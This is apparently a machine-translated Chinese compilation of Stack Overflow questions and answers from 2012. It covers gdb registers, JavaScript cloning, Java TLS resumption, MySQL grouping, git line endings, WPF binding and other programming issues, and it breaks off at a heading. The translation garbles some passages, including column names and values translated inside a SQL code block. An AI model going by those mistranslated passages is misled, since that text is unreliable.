 msr            0xd032   53298
 cr             0x80000848       2147485768
 lr             0xf18d6f8        0xf18d6f8
 ctr            0xf235d90        253975952
 xer            0x20000000       536870912
 orig_r3        0x26     38
 trap           0x300    768 
```

这甚至可能吗？我正在使用 gdb 7.0.1（我知道有点旧，但更新的版本不能很好地与我们古老的工具链配合使用）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T15:46:31.587

> 我看不到 DAR（数据访问寄存器）的内容

据我所知，该寄存器仅在内核模式下可用/可用。

你在“裸机”上调试吗？如果没有，你不应该首先寻找`DAR`寄存器。

# vb.net - 如何将 WinForms UserControl 剪辑到父控件的边界？

> ID：12318313
> 
> 赞同：0
> 
> 时间：2012-09-07T12:39:32.620
> 
> 标签：vb.net, winforms, user-controls

我有一个希望剪辑到父控件边界的用户控件。

我可以通过将用户控件的 Region 属性设置为一个矩形来实现这一点，该矩形将用户控件在父控件中的可见部分边界。

但是，这会引入大量闪烁，并且似乎会进入永久重绘模式。所以我现在的方法是不正确的。

谁能指出将用户控件剪辑到父控件边界的最佳实践和最高效的方法？

# javascript - 日志：未捕获 RangeError：超出最大调用堆栈大小

> ID：12318317
> 
> 赞同：2
> 
> 时间：2012-09-07T12:39:52.447
> 
> 标签：javascript, jquery, prototype

我对一种方法有一个严重的问题。所以这是我的方法：

```
Object.prototype.clonage = function() {
  var newObj = (this instanceof Array) ? [] : {};
  for (i in this) {
    if (i == 'clone') continue;
    if (this[i] && typeof this[i] == "object") {
      newObj[i] = this[i].clonage();
    } else newObj[i] = this[i]
  } return newObj;
} 
```

浏览器给了我：

> 未捕获的 RangeError：超出最大调用堆栈大小

在线：

```
for (i in this) { 
```

有人有同样的问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:41:56.010

如果这是任何一种成就，我可以制作可以破坏您的克隆功能的 javascript 对象:)。

检查：http: [//jsfiddle.net/Bd6XL/2/](http://jsfiddle.net/Bd6XL/2/)

```
var x = { 
    a: 5, 
    b: "asdf" 
};
var y = { 
    a: 5, 
    b: "asdf" 
};

x.y = y;
y.x = x; 
```

克隆其中任何一个。是的，由于循环引用，它不会工作。尝试调试您的对象并查看是否有任何循环引用。

还可以尝试将您的克隆限制在您真正需要的范围内。

编辑：

看看这个关于克隆的问题：[在 JavaScript 中深度克隆对象的最有效方法是什么？](https://stackoverflow.com/questions/122102/what-is-the-most-efficient-way-to-clone-a-javascript-object)

有不少答案。如果您使用 jQuery，请尝试接受的一种：

```
// Shallow copy
var newObject = jQuery.extend({}, oldObject);

// Deep copy
var newObject = jQuery.extend(true, {}, oldObject); 
```

# java - 在 Java 中恢复 TLS 连接

> ID：12318325
> 
> 赞同：1
> 
> 时间：2012-09-07T12:40:13.137
> 
> 标签：java

我正在研究 Java TLS 客户端和服务器，女巫会经常通信。我知道协商 TLS 连接非常耗费资源和时间。[我在GnuTLS](http://www.gnu.org/software/gnutls/manual/html_node/Client-with-Resume-capability-example.html)中找到了一个非常有趣的解决方案。我很感兴趣是否可以创建具有恢复功能的 Java TLS 客户端 - 使用先前协商的数据建立新连接。

最好的祝愿

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:05:16.110

只要您使用相同的 SSLSocketFactory 创建套接字，Java 中的 JSSE 实现将自动恢复现有会话，如果会话仍然有效。

您可以通过调用`SSLSocket.getSession().getId()`并检查两个不同的套接字是否使用相同的会话来验证这一点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-01-31T23:24:21.290

实际上，您必须保留的是 sslcontext，因为它包含 ssl 会话缓存。SSLContext 还有一个 SSLSessionContext getClientSessionContext()。此 SSLSessionContext 允许您调整要保留多少个 ssl 会话以及保留多长时间。

不幸的是，在第 3 方中访问 SSLContext 设置的情况非常罕见。他们为您包装它，认为它们对您有帮助，或者他们什么都不做，要求您提供 SSLServerSocketFactory 类名（甚至不是一个预先调整的实例）。

在客户端套接字的情况下，它只是有困难。我通常必须准备一个线程本地套接字工厂，以预计套接字将打开几十个更深的堆栈帧。

诀窍是提供轻量级socketfactory（客户端或服务器）的类名，它只查找包含您以所需方式初始化的真正工厂的threadlocal（使用ssl会话缓存，作为服务器或客户端）。

# php - PHP：PHP 登录和登录（设置父文件夹的会话路径）

> ID：12318327
> 
> 赞同：0
> 
> 时间：2012-09-07T12:40:21.357
> 
> 标签：php

我的登录代码是：

```
 session_start();
                if (isset($_COOKIE["cookiename"])){
                 $unm = $_SESSION["user_name"];
                  echo "User :  " . $_SESSION["user_name"] . "";
                  echo " <a href='http://localhost/UI/user/logout.php'>logout</a>";
                   echo " <a class='addmeeting' href='http://localhost/UI/user/createmeeting.php' title='Create New Meeting'>Create Meeting</a>";}

                else{
                  echo "<li><a href='register.php'>Register</a></li>";
                  echo " User : Guest!<br />";
                } 
```

当用户登录时，我希望有一个 Logout 链接，当他们没有登录时，一个 Register 链接。

我的文件如下：

```
 UI
    user(folder)
       userprofile.php
       login.php
       logout.php  
    headers.php 
    index.php 
    footer.php 
```

当我登录时，它总是显示注销，除了在 index.php 上。但是，在用户文件夹之外，它显示注册。

这里可能有什么问题？
现在我更新我的问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:45:23.570

您可能从 /user 文件夹中的脚本定义了 cookie（使用 setcookie 或类似的东西）。

如果您希望 cookie 可从其他文件夹获得，则必须设置 setcookie 函数的 $path 参数：

[设置cookie（）](http://fr2.php.net/manual/en/function.setcookie.php)

但请注意，使用 cookie 来处理用户身份验证是一个非常糟糕的主意。

# mysql - 如何在 MySQL 中为一列应用 DISTINCT 选择器

> ID：12318330
> 
> 赞同：2
> 
> 时间：2012-09-07T12:40:37.880
> 
> 标签：mysql, sql

我有一张如下表：-

```
表：交易
+----+--------+---------+----------+------------+
| 身份证 | 姓名 | 纬度 | 经度| 结束日期 |
|----+--------+----------+----------+------------+
| 1 | 比萨饼| 10.5 | -10.5 | 2012-12-12 |
| 2 | 比萨饼| 11.5 | -10.5 | 2012-12-12 |
| 3 | 果冻| 21.5 | -10.5 | 2012-12-12 |
| 4 | 果冻| 23.5 | -10.5 | 2012-12-12 |
| 5 | 百合 | 19.5 | -10.5 | 2012-12-12 |
+----+--------+---------+----------+------------+

```

我正在使用`latitude`and`longitude`来查找到那个人的距离。但我需要结果`DISTINCT`基于`name`. 我还需要按我计算的距离对结果进行排序并应用限制 0,3。

我目前使用的查询是“-

```
SELECT *,
   ( 6371 * Acos(Cos(Radians(9.939625)) * Cos(Radians(lat)) * Cos(
                               Radians(lng) - Radians(76.259498)) +
                          Sin(Radians(9.939625)) * Sin(Radians(lat))) ) AS
   distance
FROM   deals
WHERE  1
   AND end_date >= Now()
HAVING distance < 20000
ORDER  BY id DESC,
      distance
LIMIT  0, 3; 
```

简而言之，我需要的是：-

1.  最近的交易列表（按距离排序）
2.  应用 distinct to `name`（这样比萨饼和果冻都只会出现一次）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:49:10.993

您需要申请`MIN`获得每个名称、`GROUP BY`名称（每个名称给出一个结果）的最小距离和`ORDER BY`距离，然后是 id；

```
SELECT *,
   MIN( 6371 * Acos(Cos(Radians(9.939625)) * Cos(Radians(latitude)) * Cos(
                               Radians(longitude) - Radians(76.259498)) +
                          Sin(Radians(9.939625)) * Sin(Radians(latitude))) ) 
AS distance
FROM   deals
WHERE  end_date >= Now()
GROUP BY name
ORDER  BY distance, id DESC 
```

我应该补充一点，这个查询可能适合您的情况，但通常不是很有用，因为如果您想知道最近的比萨店的纬度和经度，您将需要一个完全不同的查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:46:20.853

```
SELECT *, 
   ( 6371 * Acos(Cos(Radians(9.939625)) * Cos(Radians(lat)) * Cos( 
                               Radians(lng) - Radians(76.259498)) + 
                          Sin(Radians(9.939625)) * Sin(Radians(lat))) ) AS 
   distance 
FROM   deals 
WHERE  1 
   AND end_date >= Now() 
GROUP BY name
HAVING distance < 20000 
ORDER  BY id DESC, 
      distance 
```

# wpf - 具有多个源的组合框数据绑定

> ID：12318334
> 
> 赞同：1
> 
> 时间：2012-09-07T12:40:57.503
> 
> 标签：wpf, vb.net, data-binding, combobox

我最近从 Visual Basic 5 切换到 Visual Basic .NET，我正在尝试学习 WPF，将旧程序从 Windows 窗体（使用 Visual Basic 5 编写）转换为 WPF&VB.NET。

在旧程序中，我有一个组合框，其中包含从访问数据库（带有 item_id 和 item_description 的简单表）加载的信息。单击组合框中的项目会导致 id 保存在一个类中（将其信息保存在数据库中的不同表中）

现在我正在尝试在 WPF 中重新创建相同的东西。

我想知道是否可以让组合框显示项目列表中的项目，将其项目源绑定到项目列表视图模型，但在我更改所选项目时更新另一个视图模型。

我不知道这是否可行（老实说，我试图在网上找到答案，但在寻找“组合框多个数据绑定”时，我最终找到了对我没有帮助的信息）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:10:12.380

不确定我是否真的理解你的意思，但你可以设置一个 itemsource ，它将成为组合框的内容。也可以将组合框的选定值绑定到另一个属性。

```
<ComboBox ItemSource="ListItems" SelectedValuePath="item_id" SelectedValue={Binding IdSelected} DisplayMemberPath="item_description"/> 
```

在此示例中，ListItems 将是包含项目的列表，SelectedValuePAth 将是组合框 SelectedValue 属性将返回的属性名称。SelectedValue 绑定到需要此信息的其他对象的属性。DisplayMemberPath 是向用户显示的属性。

您可以使用 CboItem.Itemssource = listItem 在运行时设置 itemssource，它可以是几乎任何类型的集合（列表、数据集、数组等）

希望有帮助。

# windows - 添加 .gitattribute 后 git reset --hard 的问题 -- 不应该存在的本地更改

> ID：12318336
> 
> 赞同：13
> 
> 时间：2012-09-07T12:41:02.027
> 
> 标签：windows, git, gitattributes

在合并我同事的捆绑包后，我观察到了 CRLF 问题。有时，带有 LF 的行会被混入源代码中，可能是那些被合并的行。因此，我们决定添加`.gitattributes`具有以下内容的文件（已删除注释）：

```
*.cpp text
*.h text
*.inc text
*.cfg text
*.dic text

*.sln text eol=crlf
*.vcxproj text eol=crlf
*.filters text eol=crlf
*.user text eol=crlf
*.rc text eol=crlf
*.rc2 text eol=crlf 
```

现在我观察到奇怪的行为。我可以看到很多`modified: ...`不应该存在的文件（即未暂存的）。我试过`git reset --hard`了，但文件仍然具有相同的状态。我试图再次克隆存储库——结果相同。

我已经`git version 1.7.11.msysgit.0`从`Git-1.7.11-preview20120620.exe`下载的当前版本的 Windows 安装。

我还应该尝试什么？

谢谢，彼得

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2014-02-28T15:19:12.427

## 原因

它是`* text=auto`导致`.gitattributes`此问题的原因。您可以删除它并从此过上幸福的生活，但是您的 repo 中可能有具有非 repo 默认行编码的文件，甚至具有几种不同行结束编码的文件（即 LF 和 CRLF，甚至 CR！）。

## 为什么会发生这种情况（详细信息）

当 git 按原样签出文件时，它将*在 add/commit 上修改行尾*。该文件实际上尚未修改，但 git 已经将其视为已修改，因为*它将是*，由于 repo 的设置。

不知何故，它与 git 一起工作有点奇怪。例如，`git reset --hard`有时有效，有时无效，可能取决于您的设置。或者，如果您进入`.gitattributes`并将扩展标记为二进制，则*修改后*的文件会神奇地消失：

```
*.ext binary 
```

即使您删除了二进制标记，即使您`git reset --hard`再次执行此操作，效果仍然存在，因此它可能是 git 错误或 git 缓存问题。对文件执行`git -rm`然后执行`git reset --hard`恢复*修改*的标记。

## 如何修复它

我们在这里假设您希望保留您的`* text=auto`设置，以便 git 警告您现在和将来各种文本文件中的行尾不一致。如果是这样，请选择您的方法：

**选项 0**：暂时欺骗 git 将文件标记为已*修改*

1.  编辑`.gitattributes`、注释`* text=auto`、保存
2.  `git status`（这一步需要 git 记录 .gitattributes 中的更改）
3.  `git reset --hard`（如果您做了任何更改，这将恢复`* text=auto`并取消您工作目录中的任何更改）。

这通常有效（除了在最顽固的情况下）。它还推迟了问题，该问题很可能会在稍后出现，因为行尾仍未标准化。

当您必须回退尚未规范化的先前提交时，此选项非常有用，例如在变基期间或其他一些 git 工作期间，您知道现有的后续提交将使行尾正常化，但 git 抱怨修改后的文件现在阻止您从继续。因此，当您需要 git 关闭并忽略确实没有针对您的特定上下文进行修改的已修改文件时，基本上使用此方法。

**选项 1**：简单的“最终用户”修复

如果您只有几个文件，请确保您的`.gitattributes`和`core.autocrlf`设置为您喜欢的，然后只需制作一个`git add/commit`，您应该不会再看到此问题。如您的配置中所述，这些文件将转换为您想要的行尾并存储在您的存储库中。此提交将作为“整个文件已更改”存储在您的存储库中，因为每一行都会更改其行尾。对于较大或开源存储库中的一些文件，这很好。确保将该提交合并或挑选到您的所有分支中，因为该问题将存在于具有这些文件的所有分支中，直到您修复它为止。顺便说一句，这里是您可以使用选项 0 的地方。即，如果您切换到未修复的分支，并且它抱怨，请运行选项 0，然后进行修复（合并或挑选）。

重要提示：如果您要使用选项 1 的这条路线，请务必正确转换*修改后*的文件。git 可能不会像你期望的那样为你做这件事，所以在你提交之前自己做，即使用这个：[将换行格式从 Mac 转换为 Windows](https://stackoverflow.com/questions/6373888/converting-newline-formatting-from-mac-to-windows#14155400) git 可能会感到困惑的原因是我已经看到了具有所有三个 CR 的文件， LF 和 CRLF 行结束格式在其中。在提交之前，自己将它们核对成您喜欢的格式。

**选项 2**：高级机制“git 历史重写”修复：

如果您有更私密的仓库并且不怕重写历史记录，请查看以下内容： [由于 mac 行结尾，git 将整个文件视为一行](https://stackoverflow.com/questions/21732903/git-sees-entire-file-as-one-line-due-to-mac-line-endings/21740678#21740678) 这将重写整个仓库并消除所有树、分支上的任何行结尾问题， 永远！确保包括所有可能需要规范化的潜在麻烦的文本文件扩展名，否则它们可能会在以后出现。

就我而言，我做了选项 2，因为我正在处理许多分支中的许多文件结尾问题。但是后来我出现了一些意外的扩展，我没有规范化，只是做了选项 1，因为我只错过了 5-6 个文件。

# python - python替换文件行中的多个模式

> ID：12318340
> 
> 赞同：4
> 
> 时间：2012-09-07T12:41:10.157
> 
> 标签：python, file

在过去的两个小时里，这是一个让我很烦恼的问题。我有一个包含多行的模板文件，在某些行中，某些单词必须由其他一些单词更改。这是我的模板的样子：

```
subnet {{ MY_SUBNET }} netmask {{ MY_NETMASK }} {}

subnet {{ MY_SUBNET }} netmask {{ MY_NETMASK }}
{
option domain-name-servers {{ MY_DOMAIN_IP }}; 
option domain-name {{ MY_DOMAIN_NAME }}; 
option routers {{ MY_GATEWAY }}; 
option broadcast-address {{ MY_BROADCAST }}; 
```

这是我正在使用的代码：

```
f = open(DHCPD_PATH, 'w')
g = open(TEMPLATE_PATH, 'r')
patterns = { 
   '{{ MAC_ADDRESS }}'     : mac,
   '{{ IP_ADDRESS }}'      : ip, 
   '{{ MY_IP }}'           : MY_IP,
   '{{ MY_DOMAIN_IP }}'    : MY_DOMAIN_IP,
   '{{ MY_DOMAIN_NAME }}'  : MY_DOMAIN_NAME,
   '{{ MY_NETMASK }}'      : MY_NETMASK,
   '{{ MY_GATEWAY }}'      : MY_GATEWAY,
   '{{ MY_SUBNET }}'       : MY_SUBNET,
   '{{ MY_BROADCAST }}'    : MY_BROADCAST,
}   
content = g.read()
for i,j in patterns.iteritems():
   content = content.replace(i,j)
f.write(content)
f.close()
g.close() 
```

这是我得到的文件：

```
subnet 192.168.10.0 netmask {{ MY_NETMASK }} {}

subnet 192.168.10.0 netmask 255.255.255.0
{
  option domain-name-servers 192.168.10.10;
  option domain-name "localnet.lan";
  option routers 192.168.10.1;
  option broadcast-address 192.168.10.255;
  default-lease-time 600;
  max-lease-time 7200;
  filename "pxelinux.0";
  next-server 192.168.10.3; 
```

我不明白为什么这个 {{ MY_NETMASK }} 仍然存在，而其中一个已被正确替换，而其他所有模板模式也被正确替换。

谁能给我一个提示？或者至少解释一下如何纠正它？

非常感谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T12:46:47.843

@eumiro 猜对了：您的空间之一不是空间。

```
>>> repr('subnet {{ MY_SUBNET }} netmask {{ MY_NETMASK }} {}')
"'subnet {{ MY_SUBNET }} netmask {{ MY_NETMASK\\xc2\\xa0}} {}'"
                                              ^^^^^^^^^^ 
```

看起来像一个不间断的空间。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:31:32.543

非常感谢*！*

为了提供更完整的答案（尽管您的答案很清楚可以解决我的问题），我想提供 vim 配置，这样可以避免我的痛苦：

为空格和表格提供不同的颜色：

```
:set syntax=whitespace 
```

~/.vimrc 配置文件中的这一行如果你在打开文件后使用 :list 命令打印大部分不可见字符（:list! 以返回正常视图）：

```
set listchars=nbsp:¤,tab:>-,trail:¤,extends:>,precedes:<,eol:¶,trail:· 
```

再次感谢

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T13:01:49.390

除了其他人指出的“不确定”字符...

这可能是矫枉过正*，但是*- 我很想安装[jinja2 模板库](http://jinja.pocoo.org/)，给它`TEMPLATE_PATH`（作为字符串，或者作为环境或文件的一部分），然后发出`.render`你的`PATTERNS`，这将成为：

```
PATTERNS = {
    'MAC_ADDRESS': '121422242424',
    # etc...
} 
```

替换也将一次性完成，而不是迭代搜索/替换。您还可以在模板中放入合理的默认值，即：`option something {{ MY_IP|default('127.0.0.1') }}`

# wcf - 无法从 BizTalk WCF 发布向导将 WCF 服务发布到本地主机

> ID：12318343
> 
> 赞同：2
> 
> 时间：2012-09-07T12:41:14.103
> 
> 标签：wcf, biztalk, publishing, biztalk-2010

这一直困扰着我很长时间，令我惊讶的是我在网上找不到任何关于此的信息。

我有一个想要作为 WCF 服务公开的 BizTalk 业务流程。我打开 BizTalk WCF 服务发布向导，选择服务端点、WCF-WSHttp 和启用元数据端点，我选择将 BizTalk 业务流程发布为 WCF 服务，然后选择程序集，然后选择端口，设置命名空间。所有这一切都很好，现在在 WCF 服务位置步骤中，我单击在我的主机文件中定义的主机中的浏览类型，而不是本地主机，我收到错误主机“...”无效。主机“...”上的万维网服务 (W3SVC) 不可用。访问被拒绝。

[BTS WCF 服务部署错误 http://files.victorfeinman.com/files/Photos/BTSDeployError.png](http://files.victorfeinman.com/files/Photos/BTSDeployError.png)

我在这里尝试了很多，以管理员身份运行，但没有这样做。我已经尝试通过我在主机文件中定义的主机名发布到远程服务器 - 这有效。我已经尝试从其他机器发布到我的本地机器 - 这很有效。但是我不能使用 localhost 以外的任何主机名发布到我的本地机器。

我觉得好像缺乏关于这个“问题”的在线内容意味着它是微不足道的。我希望是这样，尽管有点尴尬。

我运行 BizTalk 2010、Windows 7、Visual Studio 2010。

* * *

**更新：**我使用主机名 services.xyz.com 测试了向远程服务器的发布，即使我可以在向导中浏览到该站点，该向导仍将新应用程序和服务放置在远程计算机的“默认网站”中. 然后我尝试向 services.xyz.com 站点添加一个具有唯一端口的附加绑定，并再次尝试部署，这次指定唯一端口和 Vola，它按我的需要工作（对于远程服务器）。基于正确站点在所需路径中创建的新 WCF 服务。伟大的。然后我做的下一件事是向我尝试使用唯一端口发布到的本地站点添加另一个绑定，仍然将我的主机名设置为 somehost.com。这并没有改变我无法使用 somehost.com “浏览...”的事实，但是，在“位置”字段中，`[http://localhost:8080/products](http://localhost:8080/products)`) 并完成发布向导。令我惊讶的是，这确实有效。我想要的 WCF 服务是在我想要的站点和文件位置中创建的。即使目标站点没有“localhost”或空（任何）主机名的绑定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-09T20:29:09.970

这可能是防火墙或网络问题。

当您使用 localhost 时，它会转到环回 IP 地址 127.0.0.1。

当您使用服务器名称时，它会转到外部 IP 地址。

还有“。” 服务后的空间可能会给您带来一些问题。

# c# - 如果以本地管理员身份运行，如何签入 C#

> ID：12318353
> 
> 赞同：5
> 
> 时间：2012-09-07T12:41:42.397
> 
> 标签：c#, windows-identity

> **可能重复：**
> [如何判断我的进程是否以管理员身份运行？](https://stackoverflow.com/questions/509292/how-can-i-tell-if-my-process-is-running-as-administrator)

如果我的进程以本地管理员身份运行，如何使用 C# 检查？

我知道如何确定当前用户是否是内置管理员组的成员。但这不是我想知道的。我想知道当前用户是否是（唯一的）特殊本地管理员帐户。

我也知道如何检索当前用户的名称，但我不想将其与硬编码名称“Administrator”进行比较，因为这不适用于 Windows 的本地化版本（例如西班牙语中的“Administrador”、“Administrateur”法语等）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:42:48.557

这是我使用的方式

```
 WindowsIdentity user = WindowsIdentity.GetCurrent();
    WindowsPrincipal principal = new WindowsPrincipal(user);
    bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator); 
```

# php - 来自 Symfony2 中命令组件的 getHost() 或 $_SERVER['SERVER_NAME']

> ID：12318360
> 
> 赞同：2
> 
> 时间：2012-09-07T12:42:08.877
> 
> 标签：php, symfony

我正在 Symfony2 中执行一个任务（命令组件），我想使用

```
$this->getRequest()->getHost() 
```

就像我在控制器中所做的那样。获取该值的方法是什么（/Command/MyCommand.php）？

我知道我能做到`$_SERVER['SERVER_NAME']`。但是，我想为此使用 Symfony。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T12:45:52.337

如果您需要主机，您可以从路由器上下文中获取它：

```
$host = $this->getContainer()->get('router')->getContext()->getHost(); 
```

但是由于您正在寻找`SERVER_NAME`- 在从控制台执行脚本期间它将不可用。

这种情况的解决方法可能是在参数中定义您的参数并获取它`Command`：

```
$serverName = $this->getContainer()->getParameter('your_defined_param'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-04-06T23:06:04.687

我知道这是一个非常古老的问题，但它在 Google 搜索结果中的排名很高。

从 Symfony 2.1 开始，您可以向 parameters.yml 添加其他字段

```
# app/config/parameters.yml
parameters:
    router.request_context.host: example.org
    router.request_context.scheme: https
    router.request_context.base_url: my/path 
```

这适用于 Symfony 4.1 之前的所有版本

值得一提的是，您还必须使用**url**（绝对）而不是**路径**（相对）

链接到手册[Symfony.com - 如何从控制台生成 URL](https://symfony.com/doc/2.8/console/request_context.html)

# c# - System.Collections.IEnumerator 对象的意外行为

> ID：12318361
> 
> 赞同：1
> 
> 时间：2012-09-07T12:42:09.750
> 
> 标签：c#, ienumerable

我想删除集合中的所有元素，因为我没有看到`.RemoveAll`或这样，所以我使用下面的代码。

```
int number = addressBook.Items.Count;
System.Collections.IEnumerator enumerator = ...
while (enumerator.MoveNext())
{
  target = enumerator.Current as Outlook.ContactItem;
  target.Delete();
} 
```

但是，我注意到集合中剩余元素的数量大约是程序每次运行的一半。我的结论是它`.Delete()`本身会跳到下一个元素，这意味着`.MoveNext()`循环的条件会跳到下一个元素**之后**。

所以我尝试如下重置枚举器。

```
int number = addressBook.Items.Count;
System.Collections.IEnumerator enumerator = ...
while (enumerator.MoveNext())
{
  target = enumerator.Current as Outlook.ContactItem;
  target.Delete();
  enumerator.Reset();
} 
```

但是，当我检查时，`.Count`我发现在删除最后一个元素并重置枚举器之后，剩余的元素数仍然为 1。当然，我遇到了一个例外。

我在这张照片中缺少什么？我知道这不是一个错误，因为**它**会在很久以前被报告和解决......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:53:15.860

IEnumerator 只能*在基础集合保持不变的情况下*使用。一旦它发生变化（例如通过从中删除元素），枚举器就会不可恢复地失效。

您只是不能在修改集合时使用一个枚举器来浏览集合，而 Reset 也无济于事。您只需要每次都创建一个新的枚举器。例如，类似的东西可能会起作用：

```
while (addressBook.Items.Count > 0)
{
    foreach(Outlook.ContactItem target in ...)
    {
        target.Delete();
        break; // <-- !
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:52:07.437

请参阅[Marc Gravell 的回答](https://stackoverflow.com/a/3948450/770710)。

> 复位是多余的；以至于在语言规范中要求迭代器块在重置时抛出异常。正确的做法是简单地处理和释放旧的迭代器，然后再次调用 GetEnumerator。或者更好：避免阅读两次，因为并非所有数据都是可重复的。

请参考以下链接：

[当调用 IEnumerator.Reset() 方法时，当](https://stackoverflow.com/questions/3947786/when-ienumerator-reset-method-is-called)[foreach 对其进行迭代时，无法从集合中添加/删除项目？](https://stackoverflow.com/questions/3040824/cant-add-remove-items-from-a-collection-while-foreach-is-iterating-over-it)

[使用 IEnumerator 删除项目](http://social.msdn.microsoft.com/Forums/is/csharpgeneral/thread/2f3d4f15-fa49-450d-994c-77b582d4f6dd)

希望这有帮助..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:20:43.537

两件事情。

1.  只要在删除每个项目后重新实例化它，您就应该能够使用枚举器删除所有项目。使用 LINQ，它应该如下所示：

    ```
    while (addressBook.Items.Count > 0)
    {
        addressBook.Items
            .OfType<Outlook.ContactItem>()
            .Last()
            .Delete();
    } 
    ```

2.  根据 MSDN，您实际上必须删除**从最后一项开始**的项目：http : [//msdn.microsoft.com/en-us/library/microsoft.office.interop.outlook._contactitem.delete.aspx](http://msdn.microsoft.com/en-us/library/microsoft.office.interop.outlook._contactitem.delete.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-08T17:29:31.060

我希望使用[Enumerable.Reverse](http://msdn.microsoft.com/en-us/library/bb358497.aspx)扩展将是对解决方案的可喜改进`while...Last().Delete()`。这可能是这样的：

```
foreach(var target in addressBook.Items
    .OfType<Outlook.ContactItem>()
    .Reverse())
{
    target.Delete();
} 
```

我不`Reverse`经常使用；事实上，我不记得曾经在生产代码中使用过它，但我也不必与 Outlook 进行互操作。这里的好处是您不会像该`while...Last().Delete()`方法那样在每次删除项目后重复遍历整个列表剩余部分。当项目列表很小时，性能可能没有太大（任何？）差异，但是如果遍历很昂贵（我想这是因为这可能归结为引擎盖下的 COM iterop 调用）或者如果列表是大，那么性能差异可能很大。唯一确定的方法是测试/配置文件。

# php - 将选项值存储在选择框中的正确方法

> ID：12318365
> 
> 赞同：0
> 
> 时间：2012-09-07T12:42:18.907
> 
> 标签：php, jquery, html, forms, html-table

很抱歉发布一个已经发布的问题，但是我真的很难让这个功能发挥作用。当我更改选择框选项值时，我希望它在页面刷新或注销时保持不变。我必须使用 AJAX/PHP 来让它工作吗？我试图这样做无济于事。[选择下拉菜单时可以运行数据库更新功能](https://stackoverflow.com/questions/12300358/possible-to-run-db-update-function-when-dropdown-is-selected)。

我的代码如下所示：

```
echo '<tr>';
    echo '<td><input type="text" name="order_no[]" value="' . $row['Orderno'] . '"/></td>';
    echo '<td><input type="text" name="order_date[]" value="' . $row['Orderdate'] . '"/></td>';
    echo '<td><input type="text" name="order_ordered_by[]" value="' . $row['Orderedby'] . '"/></td>';
    echo '<td><input type="text" name="order_supplier[]" value="' . $row['Supplier'] . '"/></td>';
    echo '<td><input type="text" name="order_total_price[]" value="' . $row['totalprice'] . '"/></td>';
    echo '<td><input type="text" name="order_requested_by[]" value="' . $row['requestedby'] . '"/></td>';
    echo '<td>';
    echo '<select id ="id" name="id">';
    echo '<option value = "1" class = "pending">Pending</option>';
    echo '<option value = "2" class = "approved">Approved</option>';
    echo '<option value = "3" class ="disapproved">Disapproved</option>';
    echo '</select>';
    echo '</td>';
    echo '</tr>'; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:55:03.077

听起来选定的状态应该是订单的一个属性。因此，您应该对 PHP（或任何您的服务器端语言）进行 ajax 调用，以在选择框更改时更新状态。选择框本身应该类似于：

```
echo '<select id ="id" name="id">';
echo '<option value = "1" class = "pending"' . ($row['status'] == 'Pending' ? ' selected=selected' : '') . '>Pending</option>';
echo '<option value = "2" class = "approved"' . ($row['status'] == 'Approved' ? ' selected=selected' : '') . '>Approved</option>';
echo '<option value = "3" class ="disapproved"' . ($row['status'] == 'Disapproved' ? ' selected=selected' : '') . '>Disapproved</option>';
echo '</select>'; 
```

我不认为cookie是必要的

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:44:03.133

您可以将选定的值存储在 cookie 中，看看[jquery cookie](https://github.com/carhartl/jquery-cookie)插件。

或者，如果您能够以某种方式识别用户，您可以将值存储在服务器上并立即呈现。但是当您声明时，即使在注销后也应该保留所选值，无论如何您都需要 cookie 来存储一些标识令牌。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:51:34.040

只需执行以下 jquery 和 ajax 代码即可

```
$('#id').change(function(){
   var val = $('#id').val();
   $.ajax({
        type: 'POST',
        url: '',//url of the file
        data: val,
        success: function(msg){
      }
    });
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T12:51:39.013

[JQuery UI](http://jqueryui.com/demos/autocomplete/)上有一个很好的例子，它使用了一个自动完成框。恕我直言，比选择下拉菜单好得多。它具有所有 AJAX 功能，只需几行代码即可获得一个工作示例：

```
<script>
    $(function() {
        $( "#birds" ).autocomplete({
            source: "search.php",
            minLength: 2,
            select: function( event, ui ) {
                log( ui.item ?
                    "Selected: " + ui.item.value + " aka " + ui.item.id :
                    "Nothing selected, input was " + this.value );
            }
        });
    });
    </script> 
```

# javascript - 如何在javascript中更改数组键

> ID：12318369
> 
> 赞同：0
> 
> 时间：2012-09-07T12:42:39.327
> 
> 标签：javascript, sorting

> **可能重复：**
> [Javascript 交换数组元素](https://stackoverflow.com/questions/872310/javascript-swap-array-elements)

例如，我有一个数组`var arr = ['one', 'two', 'three'];`，我希望将第一个键替换为第二个，我的数组应该开始看起来像`['two', 'one', 'three'];`我该怎么做，它需要我进行冒泡排序

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:46:34.117

```
var arr = ['one', 'two', 'three'],
    temp;

temp = arr[1]; // temp is 'two'
arr[1] = arr[0]; // Now it is ['one', 'one', 'three']
arr[0] = temp; // And now it is ['two', 'one', 'three'] 
```

只需使用临时变量。

[演示](http://jsfiddle.net/amaan/msD4s/)

# c# - linq 嵌套列表包含

